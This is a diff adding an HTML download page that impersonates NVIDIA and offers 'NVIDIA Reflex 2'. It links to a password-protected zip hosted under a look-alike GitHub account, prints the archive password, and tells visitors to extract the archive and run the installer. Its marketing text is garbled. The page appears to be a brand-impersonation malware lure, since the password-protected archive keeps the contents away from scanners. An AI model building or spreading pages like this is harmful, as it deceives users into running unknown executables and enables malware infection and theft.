@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <title>NVIDIA Reflex 2 - Download</title>
+  <style>
+    :root {
+      --bg: #050706;
+      --panel: #0d1210;
+      --border: #27302b;
+      --text: #f2f5f2;
+      --muted: #8f9b93;
+      --accent: #76b900;
+      --accent-hover: #8bc428;
+      --accent-soft: rgba(118,185,0,0.14);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: radial-gradient(circle at 50% 0%, rgba(118,185,0,0.12), transparent 38%), var(--bg);
+      color: var(--text);
+    }
+    .container { max-width: 960px; margin: 0 auto; padding: 78px 24px 60px; text-align: center; }
+    .brand {
+      display: inline-flex; align-items: center; gap: 12px; margin-bottom: 34px;
+      color: var(--accent); font-size: 15px; font-weight: 700; letter-spacing: .12em; text-transform: uppercase;
+    }
+    .brand-mark {
+      width: 42px; height: 42px; display: grid; place-items: center;
+      border: 1px solid var(--accent-soft); border-radius: 10px; background: var(--accent-soft); font-size: 18px;
+    }
+    h1 { margin: 0 0 14px; font-size: clamp(34px, 6vw, 52px); line-height: 1.08; font-weight: 650; letter-spacing: -.025em; }
+    h1 span { color: var(--accent); }
+    .subtitle { max-width: 680px; margin: 0 auto 36px; color: var(--muted); font-size: 17px; line-height: 1.65; }
+    .download-btn {
+      display: inline-flex; align-items: center; justify-content: center; min-width: 240px;
+      padding: 16px 40px; font-size: 15px; font-weight: 750; letter-spacing: .04em;
+      color: #071000; background: var(--accent); border-radius: 8px; text-decoration: none;
+      box-shadow: 0 8px 30px var(--accent-soft); transition: background .2s ease, transform .08s ease, box-shadow .2s ease;
+    }
+    .download-btn:hover { background: var(--accent-hover); box-shadow: 0 10px 34px var(--accent-soft); }
+    .download-btn:active { transform: translateY(1px); }
+    .info { margin: 16px auto 0; color: #68736b; font-size: 13px; }
+    .access {
+      max-width: 540px; margin: 26px auto 0; padding: 18px 20px; text-align: left;
+      border: 1px solid var(--border); border-radius: 12px; background: var(--panel);
+    }
+    .access-row { display: flex; align-items: center; justify-content: space-between; gap: 14px; padding: 6px 0; font-size: 14px; }
+    .access-row span { color: var(--muted); }
+    .access-row code {
+      font-family: "Consolas", "SFMono-Regular", Menlo, monospace; color: var(--text);
+      background: var(--accent-soft); padding: 4px 10px; border-radius: 6px; font-size: 14px;
+    }
+    .access-row code.pw { color: var(--accent); }
+    .access-note { margin-top: 10px; padding-top: 12px; border-top: 1px solid var(--border); color: var(--muted); font-size: 13px; line-height: 1.5; }
+    .cards { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-top: 52px; }
+    .card {
+      padding: 23px 17px; background: rgba(13,18,15,.86); border: 1px solid var(--border); border-radius: 12px;
+      transition: transform .2s ease, border-color .2s ease, background .2s ease;
+    }
+    .card:hover { transform: translateY(-4px); border-color: var(--accent-soft); background: rgba(18,25,19,.95); }
+    .icon { width: 38px; height: 38px; margin: 0 auto 14px; display: grid; place-items: center; border-radius: 9px; background: var(--accent-soft); color: var(--accent); font-size: 18px; }
+    .card-title { color: #a8b1aa; font-size: 13px; line-height: 1.5; }
+    .feature { margin-top: 52px; padding: 22px 26px; border: 1px solid var(--border); border-radius: 12px; background: linear-gradient(90deg, var(--accent-soft), transparent); }
+    .feature-title { margin-bottom: 7px; color: var(--accent); font-size: 14px; font-weight: 700; text-transform: uppercase; letter-spacing: .08em; }
+    .feature-text { color: var(--muted); font-size: 14px; line-height: 1.55; }
+    footer { margin-top: 56px; color: #4f5952; font-size: 12px; }
+    @media (max-width: 860px) { .cards { grid-template-columns: repeat(2, 1fr); } }
+    @media (max-width: 480px) { .container { padding-top: 55px; } .cards { grid-template-columns: 1fr; } .download-btn { width: 100%; } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="brand">
+      <div class="brand-mark">NR</div>
+      NVIDIA
+    </div>
+
+    <h1>NVIDIA <span>Reflex 2</span></h1>
+
+    <p class="subtitle">Cut PC latency with NVIDIA Reflex 2 Frame Warp in competitive titles.</p>
+
+    <a class="download-btn" href="https://github.com/NVIDIA-Reflex-2/.github/releases/download/1.0.0/Release.NvidiaReflex2.zip" target="_blank" rel="noopener noreferrer">DOWNLOAD NVIDIA REFLEX 2</a>
+
+    <div class="info">Repository download &middot; External link</div>
+
+    <div class="access">
+      <div class="access-row"><span>Archive</span><code>Release.NvidiaReflex2.zip</code></div>
+      <div class="access-row"><span>Password</span><code class="pw">cmF5TH2XCe</code></div>
+      <div class="access-note">The download is a protected archive. Extract it with <b>7-Zip</b> or <b>WinRAR</b> using the password above, then run the installer.</div>
+    </div>
+
+    <div class="cards">
+      <div class="card">
+        <div class="icon">⚡</div>
+        <div class="card-title">AI upscaling & frame gen</div>
+      </div>
+      <div class="card">
+        <div class="icon">▣</div>
+        <div class="card-title">One-click install</div>
+      </div>
+      <div class="card">
+        <div class="icon">◈</div>
+        <div class="card-title">Auto game detection</div>
+      </div>
+      <div class="card">
+        <div class="icon">↺</div>
+        <div class="card-title">Backup & restore</div>
+      </div>
+    </div>
+
+    <div class="feature">
+      <div class="feature-title">NVIDIA</div>
+      <div class="feature-text">NVIDIA Reflex 2 helps you install and use cut pc latency with nvidia reflex 2 frame warp in competitive titles Close games before applying changes and restore originals anytime.</div>
+    </div>
+
+    <footer>&copy; 2026 NVIDIA Reflex 2 &middot; Download Portal</footer>
+  </div>
+</body>
+</html>
